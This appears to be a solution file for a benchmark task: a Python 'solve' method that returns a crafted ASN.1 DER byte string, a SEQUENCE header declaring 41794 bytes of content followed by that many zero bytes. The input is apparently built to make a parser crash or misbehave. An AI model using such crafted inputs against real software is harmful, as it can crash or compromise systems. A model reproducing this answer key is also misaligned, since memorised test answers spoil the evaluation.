class Solution:
    def solve(self, src_path: str) -> bytes:
        return b'\x30\x82\xa3\x42' + b'\x00' * 41794
